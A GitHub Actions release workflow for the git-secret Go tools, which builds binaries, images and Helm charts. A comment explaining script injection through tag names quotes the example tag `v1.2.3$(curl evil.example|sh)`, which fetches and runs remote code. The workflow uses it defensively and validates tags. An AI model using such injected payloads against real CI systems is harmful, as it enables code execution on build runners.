name: Release Go Binary

on:
  push:
    tags:
      - 'v*' # Trigger on version tags like v1.0.0, v0.1.0

jobs:
  # Client-side tools only: git-secret, kubectl-secret, git-secret-seal --
  # things a human or a CI job runs directly on their own machine, so a
  # real cross-platform matrix earns its keep here. git-secret-server and
  # git-secret-controller are the opposite case -- pure Kubernetes
  # server-side components that only ever run inside their container
  # image, never as a downloaded native binary on someone's laptop -- see
  # build-and-release-server below, which builds those two for Linux
  # only (matching the container images' own linux/amd64+arm64 platform
  # set), not this full matrix.
  build-and-release:
    name: Build and Release
    runs-on: ubuntu-latest
    permissions:
      contents: write # Needed to create releases

    strategy:
      matrix:
        goos: [linux, windows, darwin]
        goarch: [amd64, arm64]
        exclude: # No official Go support for windows/arm64 executables widely used yet
          - goos: windows
            goarch: arm64

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.25' # must match the `go` directive in go.mod

      - name: Build binaries
        env:
          GOOS: ${{ matrix.goos }}
          GOARCH: ${{ matrix.goarch }}
          # Passed as data via `env:`, not interpolated into the script
          # text below -- a tag name is attacker-controlled (anyone who
          # can push a `v*` tag), and a version like
          # `v1.2.3$(curl evil.example|sh)` is a *valid* git ref. Putting
          # `${{ github.ref_name }}` directly into the `run:` string
          # would have the runner's shell parse and execute that
          # command-substitution syntax before this job ever gets to
          # `go build`. Referenced below only as "$VERSION", an ordinary
          # variable expansion that never re-parses its own value as
          # shell syntax.
          VERSION: ${{ github.ref_name }}
        run: |
          # A shell glob's trailing "*" matches any characters, including
          # shell metacharacters, so a `case` pattern here would not
          # actually anchor the end of the string -- grep -E with ^...$
          # does.
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to build: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

          EXT=""
          if [ "$GOOS" = "windows" ]; then
            EXT=".exe"
          fi

          OUTPUT_NAME="git-secret-${GOOS}-${GOARCH}${EXT}"
          go build -v -o "${OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" .
          echo "ASSET_PATH=${OUTPUT_NAME}" >> $GITHUB_ENV

          KUBECTL_OUTPUT_NAME="kubectl-secret-${GOOS}-${GOARCH}${EXT}"
          go build -v -o "${KUBECTL_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/kubectl-secret
          echo "KUBECTL_ASSET_PATH=${KUBECTL_OUTPUT_NAME}" >> $GITHUB_ENV

          SEAL_OUTPUT_NAME="git-secret-seal-${GOOS}-${GOARCH}${EXT}"
          go build -v -o "${SEAL_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/git-secret-seal
          echo "SEAL_ASSET_PATH=${SEAL_OUTPUT_NAME}" >> $GITHUB_ENV

      - name: Checksum binaries
        run: |
          sha256sum "${{ env.ASSET_PATH }}" > "${{ env.ASSET_PATH }}.sha256"
          sha256sum "${{ env.KUBECTL_ASSET_PATH }}" > "${{ env.KUBECTL_ASSET_PATH }}.sha256"
          sha256sum "${{ env.SEAL_ASSET_PATH }}" > "${{ env.SEAL_ASSET_PATH }}.sha256"

      - name: Upload Release Asset
        uses: softprops/action-gh-release@v2
        if: startsWith(github.ref, 'refs/tags/')
        with:
          files: |
            ${{ env.ASSET_PATH }}
            ${{ env.ASSET_PATH }}.sha256
            ${{ env.KUBECTL_ASSET_PATH }}
            ${{ env.KUBECTL_ASSET_PATH }}.sha256
            ${{ env.SEAL_ASSET_PATH }}
            ${{ env.SEAL_ASSET_PATH }}.sha256
          # The release will be created automatically if it doesn't exist,
          # using the tag name as the release name.
          # You can customize release notes, etc. here if needed.

  # git-secret-server and git-secret-controller: Linux only, matching the
  # container images' own linux/amd64+arm64 platform set. Their real,
  # supported distribution artifact is the container image + Helm chart
  # below -- these standalone binaries exist only as a debugging/local-
  # dev convenience (e.g. running the controller directly against a kind
  # cluster without rebuilding an image each time), not as something
  # meant to run outside a Linux/Kubernetes environment.
  build-and-release-server:
    name: Build and Release (server components, Linux only)
    runs-on: ubuntu-latest
    permissions:
      contents: write

    strategy:
      matrix:
        goarch: [amd64, arm64]

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.25'

      - name: Build binaries
        env:
          GOARCH: ${{ matrix.goarch }}
          VERSION: ${{ github.ref_name }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to build: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

          GOOS=linux
          SERVER_OUTPUT_NAME="git-secret-server-linux-${GOARCH}"
          go build -v -o "${SERVER_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/git-secret-server
          echo "SERVER_ASSET_PATH=${SERVER_OUTPUT_NAME}" >> $GITHUB_ENV

          CONTROLLER_OUTPUT_NAME="git-secret-controller-linux-${GOARCH}"
          go build -v -o "${CONTROLLER_OUTPUT_NAME}" -ldflags="-s -w -X main.version=${VERSION}" ./cmd/git-secret-controller
          echo "CONTROLLER_ASSET_PATH=${CONTROLLER_OUTPUT_NAME}" >> $GITHUB_ENV

      - name: Checksum binaries
        run: |
          sha256sum "${{ env.SERVER_ASSET_PATH }}" > "${{ env.SERVER_ASSET_PATH }}.sha256"
          sha256sum "${{ env.CONTROLLER_ASSET_PATH }}" > "${{ env.CONTROLLER_ASSET_PATH }}.sha256"

      - name: Upload Release Asset
        uses: softprops/action-gh-release@v2
        if: startsWith(github.ref, 'refs/tags/')
        with:
          files: |
            ${{ env.SERVER_ASSET_PATH }}
            ${{ env.SERVER_ASSET_PATH }}.sha256
            ${{ env.CONTROLLER_ASSET_PATH }}
            ${{ env.CONTROLLER_ASSET_PATH }}.sha256

  docker-release:
    name: Build & push git-secret-server image
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write # Needed to push to GHCR
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Validate tag
        env:
          # Same rationale as build-and-release's own VERSION handling
          # above: passed as data via `env:`, never interpolated
          # directly into a `run:` string.
          VERSION: ${{ github.ref_name }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to build: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

      - name: Compute lowercase image owner
        # OCI/Docker repository names must be all-lowercase; GitHub org
        # names aren't required to be (this one, OpScaleHub, isn't).
        # github.repository_owner is the org/user name verbatim, so it
        # has to be lowercased before it can be used in an image tag --
        # using it directly fails the build with "repository name must
        # be lowercase" rather than silently doing the wrong thing.
        run: echo "OWNER_LC=$(printf '%s' '${{ github.repository_owner }}' | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_ENV"

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          platforms: linux/amd64,linux/arm64
          build-args: |
            VERSION=${{ github.ref_name }}
          tags: |
            ghcr.io/${{ env.OWNER_LC }}/git-secret-server:${{ github.ref_name }}
            ghcr.io/${{ env.OWNER_LC }}/git-secret-server:latest

  docker-release-controller:
    name: Build & push git-secret-controller image
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write # Needed to push to GHCR
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Validate tag
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to build: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

      - name: Compute lowercase image owner
        run: echo "OWNER_LC=$(printf '%s' '${{ github.repository_owner }}' | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_ENV"

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          file: Dockerfile.controller
          push: true
          platforms: linux/amd64,linux/arm64
          build-args: |
            VERSION=${{ github.ref_name }}
          tags: |
            ghcr.io/${{ env.OWNER_LC }}/git-secret-controller:${{ github.ref_name }}
            ghcr.io/${{ env.OWNER_LC }}/git-secret-controller:latest

  chart-release:
    name: Package & push Helm chart
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write # Needed to push to GHCR (OCI)
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Validate tag
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to package: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

      - name: Compute lowercase image owner
        # See the same step in the docker-release job above -- OCI
        # repository names must be all-lowercase, github.repository_owner
        # isn't guaranteed to be.
        run: echo "OWNER_LC=$(printf '%s' '${{ github.repository_owner }}' | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_ENV"

      - name: Set up Helm
        uses: azure/setup-helm@v4

      - name: Log in to GHCR
        run: echo "${{ secrets.GITHUB_TOKEN }}" | helm registry login ghcr.io -u ${{ github.actor }} --password-stdin

      - name: Package and push
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          # Published chart version tracks the release tag (without the
          # leading 'v') rather than the chart's own committed
          # Chart.yaml version, so a release always publishes a chart
          # whose version matches the images it deploys.
          CHART_VERSION="${VERSION#v}"
          helm package ./charts/git-secret-server \
            --version "$CHART_VERSION" \
            --app-version "$VERSION" \
            --destination /tmp
          helm push "/tmp/git-secret-server-${CHART_VERSION}.tgz" "oci://ghcr.io/${{ env.OWNER_LC }}/charts"

  chart-release-controller:
    name: Package & push git-secret-controller Helm chart
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write # Needed to push to GHCR (OCI)
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Validate tag
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
            echo "Refusing to package: tag '$VERSION' doesn't match vX.Y.Z or vX.Y.Z-suffix" >&2
            exit 1
          fi

      - name: Compute lowercase image owner
        run: echo "OWNER_LC=$(printf '%s' '${{ github.repository_owner }}' | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_ENV"

      - name: Set up Helm
        uses: azure/setup-helm@v4

      - name: Log in to GHCR
        run: echo "${{ secrets.GITHUB_TOKEN }}" | helm registry login ghcr.io -u ${{ github.actor }} --password-stdin

      - name: Package and push
        env:
          VERSION: ${{ github.ref_name }}
        run: |
          CHART_VERSION="${VERSION#v}"
          helm package ./charts/git-secret-controller \
            --version "$CHART_VERSION" \
            --app-version "$VERSION" \
            --destination /tmp
          helm push "/tmp/git-secret-controller-${CHART_VERSION}.tgz" "oci://ghcr.io/${{ env.OWNER_LC }}/charts"